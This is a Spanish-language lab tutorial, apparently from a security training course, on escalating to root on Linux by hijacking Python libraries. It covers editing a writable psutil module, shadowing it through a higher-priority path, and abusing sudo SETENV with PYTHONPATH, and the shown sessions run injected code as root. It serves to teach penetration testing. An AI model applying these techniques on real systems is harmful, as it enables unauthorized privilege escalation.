# Secuestro de la biblioteca de Python

---

Python es uno de los lenguajes de programación más populares y ampliamente utilizados del mundo y ya ha reemplazado muchos otros lenguajes de programación en la industria de TI. Hay muchas razones por las cuales Python es tan popular entre los programadores. Uno de ellos es que los usuarios pueden trabajar con una vasta colección de bibliotecas.

Muchas bibliotecas se utilizan en Python y se usan en muchos campos diferentes. Uno de ellos es[Numpy](https://numpy.org/doc/stable/). `NumPy`es una extensión de código abierto para Python. El módulo proporciona funciones precompiladas para el análisis numérico. En particular, permite un manejo fácil de listas y matrices extensas. Sin embargo, ofrece muchas otras características esenciales, como funciones de generación de números aleatorios, transformación de Fourier, álgebra lineal y muchas otras. Además, Numpy proporciona muchas funciones matemáticas para trabajar con matrices y matrices.

Otra biblioteca es[Pandas](https://pandas.pydata.org/docs/). `Pandas`es una biblioteca para el procesamiento de datos y el análisis de datos con Python. Extiende Python con estructuras y funciones de datos para procesar tablas de datos. Una fortaleza particular de los pandas es el análisis de series de tiempo.

Python tiene[La biblioteca estándar de Python](https://docs.python.org/3/library/), con muchos módulos a bordo desde una instalación estándar de Python. Estos módulos proporcionan muchas soluciones que de otro modo tendrían que resolverse laboriosamente escribiendo nuestros programas. Aquí hay innumerables horas de trabajo guardado si uno tiene una visión general de los módulos disponibles y sus posibilidades. El sistema modular está integrado en este formulario por razones de rendimiento. Si uno tendría automáticamente todas las posibilidades disponibles de inmediato en la instalación básica de Python sin importar el módulo correspondiente, la velocidad de todos los programas de Python sufriría mucho.

En Python, podemos importar módulos con bastante facilidad:

#### Importación de módulos

Código:pitón

```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

Hay muchas formas en que podemos secuestrar una biblioteca de Python. Mucho depende del guión y su contenido en sí. Sin embargo, hay tres vulnerabilidades básicas donde se puede usar secuestro:

1. Permisos de escritura incorrectos
2. Camino de la biblioteca
3. Variable de entorno de Pythonpath

---

## Wrong Write Permissions

Por ejemplo, podemos imaginar que estamos en el anfitrión de un desarrollador en la intranet de la compañía y que el desarrollador está trabajando con Python. Entonces tenemos un total de tres componentes que están conectados. Este es el script de Python real que importa un módulo Python y los privilegios del script, así como los permisos del módulo.

Un o otro módulo de Python puede tener permisos de escritura establecidos para todos los usuarios por error. Esto permite que el módulo Python se edite y manipule para que podamos insertar comandos o funciones que produzcan los resultados que queremos. Si`SUID`/`SGID`Se han asignado permisos al script de Python que importa este módulo, nuestro código se incluirá automáticamente.

Si miramos los permisos establecidos del`mem_status.py`guión, podemos ver que tiene un`SUID`colocar.

#### Guión de pitón

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Entonces podemos ejecutar este script con los privilegios de otro usuario, en nuestro caso, como`root`. También tenemos permiso para ver el script y leer su contenido.

#### Python Script - Contenido

Código:pitón

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Por lo tanto, este script es bastante simple y solo muestra la memoria virtual disponible en el porcentaje. También podemos ver en la segunda línea que este script importa el módulo`psutil`y usa la función`virtual_memory()`.

Para que podamos buscar esta función en la carpeta de`psutil`Y verifique si este módulo tiene permisos de escritura para nosotros.

#### Permisos de módulo

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Dichos permisos son más comunes en entornos de desarrolladores donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir mayores privilegios.

#### Contenido del módulo

Código:pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta es la parte en la biblioteca donde podemos insertar nuestro código. Se recomienda ponerlo bien al comienzo de la función. Allí podemos insertar todo lo que consideramos correcto y efectivo. Podemos importar el módulo`os`Para fines de prueba, que nos permite ejecutar comandos del sistema. Con esto, podemos insertar el comando`id`y verifique durante la ejecución del script si se ejecuta el código insertado.

#### Contenido del módulo - secuestro

Código:pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Ahora podemos ejecutar el script con`sudo`y verifique si obtenemos el resultado deseado.

#### Escalada de privilegios

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Éxito. Como podemos ver en el resultado anterior, pudimos secuestrar con éxito la biblioteca y tener nuestro código dentro del`virtual_memory()`función ejecutada como`root`. Ahora que tenemos el resultado deseado, podemos volver a editar la biblioteca, pero esta vez, inserte una carcasa inversa que se conecta a nuestro host como`root`.

---

## Camino de la biblioteca

En Python, cada versión tiene un orden específico en el que las bibliotecas (`modules`) se buscan e importan desde. El orden en el que Python importa`modules`De se basan en un sistema de prioridad, lo que significa que las rutas más altas en la lista tienen prioridad sobre las más bajas en la lista. Podemos ver esto emitiendo el siguiente comando:

#### Listado de Pythonpath

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder usar esta variante, son necesarios dos requisitos previos.

1. El módulo importado por el script se encuentra en una de las rutas de menor prioridad enumeradas a través del`PYTHONPATH`variable.
2. Debemos tener permisos de escritura a una de las rutas que tienen una prioridad más alta en la lista.

Por lo tanto, si el módulo importado se encuentra en una ruta más baja en la lista y nuestro usuario es editable de una ruta de mayor prioridad, podemos crear un módulo nosotros mismos con el mismo nombre e incluir nuestras propias funciones deseadas. Dado que la ruta de mayor prioridad se lee anteriormente y se examina para el módulo en cuestión, Python accede al primer golpe que lo encuentra y la importa antes de alcanzar el módulo original y previsto.

Para que esto tenga un poco más de sentido, continuemos con el ejemplo anterior y mostremos cómo se puede explotar esto. Anteriormente, el`psutil`El módulo se importó al`mem_status.py`guion. Podemos ver`psutil`'La ubicación de instalación predeterminada emitiendo el siguiente comando:

#### Ubicación de instalación predeterminada de psutil

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

De este ejemplo, podemos ver que`psutil`se instala en la siguiente ruta:`/usr/local/lib/python3.8/dist-packages`. De nuestra lista anterior de la`PYTHONPATH`Variable, tenemos una cantidad razonable de directorios para elegir para ver si podría haber alguna configuración errónea en el entorno para permitirnos`write`acceso a cualquiera de ellos. Vamos a ver.

#### Permisos de directorio mal configurados

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Después de verificar todos los directorios enumerados, parece que`/usr/lib/python3.8`La ruta está mal configurada en una forma de permitir que cualquier usuario le escriba. Verificación cruzada con valores del`PYTHONPATH`variable, podemos ver que esta ruta es más alta en la lista que en la ruta en la que`psutil`está instalado.`psutil`módulo que contiene nuestro propio malicioso`virtual_memory()`función dentro del`/usr/lib/python3.8`directorio.

#### Contenido secuestrado del módulo - psutil.py

Código:pitón

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para llegar a este punto, necesitamos crear un archivo llamado`psutil.py`que contiene los contenidos mencionados anteriormente en el directorio mencionado anteriormente. Es muy importante que nos aseguremos de que el módulo que creamos tenga el mismo nombre que la importación y tenga la misma función con el número correcto de argumentos que se le pasan como la función que tenemos la intención de secuestrar. Esto es crítico como sin ninguna de estas condiciones`true`, no podremos realizar este ataque. Después de crear este archivo que contiene el ejemplo de nuestro script de secuestro anterior, hemos preparado con éxito el sistema para su explotación.

Vamos a ejecutar una vez más el`mem_status.py`Script usando`sudo`como en el ejemplo anterior.

#### Escalada de privilegios a través de secuestro de Python Library Rath

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver en la salida, hemos obtenido con éxito la ejecución como`root`mediante el secuestro de la ruta del módulo a través de una configuración errónea en los permisos del`/usr/lib/python3.8`directorio.

---

## Variable de entorno de Pythonpath

En la sección anterior, tocamos el término`PYTHONPATH`, sin embargo, no explicó completamente su uso e importancia con respecto a la funcionalidad de Python.`PYTHONPATH`es una variable de entorno que indica qué directorio (o directorios) Python puede buscar módulos para importar. Esto es importante como si un usuario pudiera manipular y establecer esta variable mientras ejecuta el binario de Python, puede redirigir efectivamente la funcionalidad de búsqueda de Python a un`user-defined`Ubicación cuando llegue el momento de importar módulos. Podemos ver si tenemos los permisos para establecer variables de entorno para el binario de Python revisando nuestro`sudo`Permisos:

#### Comprobación de permisos de sudo

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como podemos ver en el ejemplo, se nos permite ejecutar`/usr/bin/python3`bajo los permisos de confianza de`sudo`y, por lo tanto, se les permite establecer variables de entorno para su uso con este binario por el`SETENV:`Bandera que se está estableciendo. Es importante tener en cuenta que debido a la naturaleza confiable de`sudo`, cualquier variable de entorno definidas antes de llamar al binario no está sujeto a ninguna restricción con respecto a poder establecer variables de entorno en el sistema. Esto significa que usar el`/usr/bin/python3`Binario, podemos establecer efectivamente cualquier variable de entorno en el contexto de nuestro programa en ejecución. Intentemos hacerlo ahora usando el`psutil.py`Script de la última sección.

#### Escalada de privilegios utilizando la variable de entorno de Pythonpath

  Secuestro de la biblioteca de Python

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

En este ejemplo, movimos el guión de Python anterior del`/usr/lib/python3.8`directorio`/tmp`. Desde aquí una vez más llamamos`/usr/bin/python3`para correr`mem_stats.py`, sin embargo, especificamos que el`PYTHONPATH`variable contiene el`/tmp`directorio para que obliga a Python a buscar ese directorio que busca el`psutil`módulo para importar. Como podemos ver, una vez más hemos ejecutado con éxito nuestro script en el contexto de la raíz.